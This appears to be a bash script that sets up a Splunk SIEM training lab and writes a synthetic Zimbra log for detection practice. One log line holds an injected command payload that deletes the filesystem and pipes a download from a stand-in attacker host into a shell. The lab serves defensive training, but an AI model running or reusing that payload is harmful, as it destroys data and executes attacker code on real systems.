#!/usr/bin/env bash
# Splunk VM Setup Script
set -e

echo "=== [1/4] Splunk SIEM Lab Environment Setup ==="
sudo dpkg -i splunk-*.deb 2>/dev/null || sudo rpm -ivh splunk-*.rpm 2>/dev/null || echo "[!] Install Splunk package manually if not present"

if [ -d "/opt/splunk/bin" ]; then
    echo "=== [2/4] Starting Splunk Service ==="
    sudo /opt/splunk/bin/splunk start --accept-license --answer-yes
    sudo /opt/splunk/bin/splunk enable boot-start
fi

echo "=== [3/4] Creating ~/zimbra_traffic.log ==="
cat << 'EOF' > ~/zimbra_traffic.log
2026-08-25 10:15:02 INFO  [http-bio-8443-exec-1] SoapEngine - handler invoked for Service Status
2026-08-25 10:15:30 WARN  [http-bio-8443-exec-4] snmp_notify - localized notification sent successfully
2026-08-25 10:16:12 ALERT [http-bio-8443-exec-9] swatchdog - execution payload: ; rm -rf /; wget http://malicious-attacker.com | sh;
EOF

echo "=== [4/4] Setup complete! Web UI: http://localhost:8000 ==="
